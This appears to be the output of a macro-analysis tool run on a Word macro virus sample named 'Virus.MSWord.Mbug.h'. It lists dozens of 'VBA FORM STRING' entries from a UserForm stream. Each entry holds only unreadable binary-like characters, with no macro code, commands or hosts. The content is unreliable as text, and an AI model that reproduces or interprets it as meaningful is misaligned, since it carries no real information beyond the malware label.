23#)3#)3#)3.+3#)=-11%1=-19)9F-=9)99919999999)93#)=-11%1=-11%1=-13#)3.+3#))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9cZkxcs�o�wosJBB)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^Rc^RcgZswos��wos�~��semkkxcseYVJBB3.+%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%93#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3.D<.<1993#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)1)B99JBBRB9J9)9199)!))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)ZKUsZc�mn�mnsZcskc�mnR9BJ99RBJkVcRBBRBBR9BZKUsZcZKUZKUeYVZKUR9B9)9$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
29)9)!)3#)3#)3#)3#)3.+9)91%1=-19)99919)99999)9999999=-1=-13#)=-1=-19)91%13#)3#))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)gZsxcs��kVc')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B9B^RcZKUwos�o|�w�o���k^gkck�wsemxcscccJJR9)9)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)B3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%93.D<.<3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!))%99)9BBRBBR99J9)9199)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!sZc�~�~�mnsZc�mnsZceYVJ99RBBsZcRBJZKUR9BZKUZKUR9BZKUR9BkVcZKUZKUJBJ1)B3#)3.+)!)3.+3#)3.+1%1=-19)9<.<F-=F-==-1BB9=-19999)93.+1%1=-13#)=-13.+3#)3#))%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a[~wos�~J9R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
')-JJR^Rcxcs�o|um��o|�~wosZKUkVcwoswos�o|semwoskVcBB9)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)9)9<.<991
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!19999J3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
))%9..9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)99JBBRBBR99J9)9..9')-!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)B�mn����~sZc{^c�mn�mnsZcR9BsZc�mnsZcsZcR9BR9BR9BkVcR9BZKUZKURBJZKURBBZKU�o|eYV3#)3#)3#)3.+9)9=-1<.<991=-19)9F-=9)9999999=-1=-1=-11%1=-1=-13#)3#)3#)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a[~sx���JBJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B9JkVck^gwos�o|wos��wosk^gRBB[Zlk^gxcswos���o|semsZcBB93#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1999)91)B3#)')-1)B9)999J3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
')-)!))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
')-)%9')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%91)B99JBBR9)999J199')-)%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B9J�~����mnsZc�~����mnsZcsZc{^c�mn�mnsZcsZcsZcsZcR9BR9BR9BsZcRBBJ99B9BsZc������3#)3#)3.+3#)3#)1%19)9999F-=BB9=-1F-=9999999)93.+3#)=-11%1=-13#)))!3#))%9$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)t_�����JJR3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!^Rc^Rcwos{u~woskkwossemZKU9)9ZKUccc^RckVc{u~���o|�o|cccJBJ)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%9B9B9993.+$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)!)99JJBB991
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)')-!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)9)919B)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%99)9JBJBBR9)9<.<99J')-)!))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R9B�������o|�������������mn�mn�mn�mn�mn�mnsZcsZc�mnsZcsZcsZcR9BR9B9)9ZKUwost_��w))!3#)3#)=-1=-19)9=-19)9991F-==-1BB99)9999999=-11%1=-11%1=-13#)3#)1!!$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)t_��~����k^gNPTBB9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)cckkVc{u~um�sem{u~k^gk^gJBBB9BZKUOGGJJRZKUxcs�o����~��mncccB9B1!!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%99)9B9J3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
))%9)!))%9<.<BBR999)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)1)B99JBBRBBRB9B9)9199$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cRk�������mn����������������������mn�mnsZc�mn�mn�mn�mnsZcsZcsZcF-=J99xcs9)9OGGZKU=-19)93#)9)93.+9999999999)9F-=F-=9)9999999=-13.+=-11%1=-11%1=-1)!)3#)9)9)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9t_����������kkZKU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[ZlkVcum��o|iiqk^gsemsem[Zl991J9RB9B9)999JPZmkVcwos���~�~�wosZKU<.<!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)199JBBB9B9)91)B)!))%93.+)!))!))!)9991)BJBJJBB99J3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!9)9BBR199)!))!))!)1)B?9WRBBJJZB9J9)9991)!)')-!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!eYV�~�o|������ҧ�ҧ��������������mn�mn�mnsZc�mn�mnsZc�mn�mnR9BR9BsZceYV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JJRJBB3#)3#)=-1=-19999)9999F-=F-=BB9991=-19)9999999=-13#)1%1=-13.+9)93.+)!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1t_�������������sZc!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)k^gcZksemsemk^gk^gxcsk^gJBJB9JJJRB9B)!)1)BB9JZKUk^gwos�~����~k^gOGG991
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)1)BJJR^RcJJRJJR^Rc[Zl^RcJJRB9B..91)BBBRJJRJBB199
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)BJBJ1991)B9)9B9B9)9..999JJJRJJRZKUBBR<.<999)%9')-!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)1%1RBJ������ҧ�ҧ�ҧ�ҧ��������mn�mn�mn����������������mnsZc{^c�~9)9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)JJR=-13.+9)91%19)99999999)9BB9=-19)9F-=9)9BB99)99999)9=-13#)=-13#)3#)3#))!))%9)!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!t_�������������k^g%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!JBJcckwoskVcJJRZKUJJRum��wJBB9)9^RcBB99)9)!)999JBBXFmccc����������sZcJBB3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!')-!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
')-BBR^Rc[ZlkVck^gk^giiqiiqZKUJBJ1)B9)9?9W999199
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=9)93.+)%99)9>FXJJRNPTJBJ999<<?BBRJJRJJRJ9RB9B1)B991)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)9=-1)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1%1kVc���ҧ�ҧ��������������mn�������������������mnsZc���k^g)%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J1)B1)B9999)93.+=-19)99999)9<.<F-=999F-=BB9=-1F-=999=-13#)=-11%1=-13.+3#))!))%9$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t_�������������k^g!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!kVck^gkVcJ9J1)BB9BJBB^RcwosZKUJJRkVcBB93#))!)3#)999JBJJJRkckxcs�~������skcJBB)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))%91999999991999)99999991993#))%9)!)')-')-)!))!)9)9BBR^RccZkk^gcckkkkkwoskk^RcJBB3.D')-1)B1)B)!))!)1)BJJR3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)BNPT^RccZkccck^g1)B3.DJJRJJRJJRNPTRBJ1993#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)�o|ҧ����eYV)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1%1sZc����mn�mn�mn���������������ҧ��������mn������9)9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
21-X!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J'1Y19J99J9999999999)9B9B=-19)9F-=9)99919)9999=-11%1=-11%13#)3#))!))%9)!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t_�������������^Rc$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2iiqkkZKU9913#))%91)BJBBgZsk^g^RcJBBJBB3.+1)B3.+1)B9)9B9JJBBPZmwos�������~�^Rc3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)3.+B9BJBBN?VJBB999B9BB9BB9B99J1)B9)99913#)..93#))!))%91993.DJJZcckiiqk^gk^gkkk^gum�ZKUJJR3.+!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%9XFmcRk)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%9B9BJJRcRk[Zlcckk^giiq^RcJJZJBJJJZJJRJJRB9B3.+!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�~ҧ�ܴ�ܴ����sZcJ99=-1RBB�mn���������ҧ�ҧ�ҧ����������������eYV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9##X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='1Y'1Y'1YB9B)%9999F-=BB9=-1F-=BB9F-==-1BB99919911%1=-13#)3.+)!))%9$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t_�����������~OGGBBR�o|iiq9)93#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!))%9J9RJ9RBFFB9BBB91993#))%9)%9)!))%93#)3#)99JZKUwos����o|JBB3.+B9BJBB99J9)9<.<99J999..91993#))%9))!)%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%99)9BBRkVccckiiqcZkk^gcck^RcJJRB9J3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%999JiiqJBB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
299JJJRcRkkVck^gum�sem�o�semPZmRBJ>FXBBR99J3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%9�~���ҧ����ҧ�������sZcZKU�mn������ҧ�������ҧ����ҧ��������~!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=##X'&D##X'1Y1-X1)B<.<9)9B9BF-=9)99)9F-=F-=999=-13#)=-1)!)3#)3#))!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!t_������������9)9N?V�o�OGG3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!')-JJR�o�skc9)9<.<999<.<1991)B1)B9993#)')-)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))%9<.<JJR^RccckcZk^Rc^RcJJRJJRNPT9)9')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%9JBJ^RckVc)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)BJBJJJRiiqiiqkkk^gum�wos{u~um�kVcJBJ3.DB9B)%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)3.+')-)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=-1�~ҧ�ҧ����������ҧ�������������������������������������ҧ�RBB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=##X1-X1-X1)BB9BB9BBB9F-=B9BBB9=-19)99)93.+=-13#)3#))!)3#)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)!)3#)3#)3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
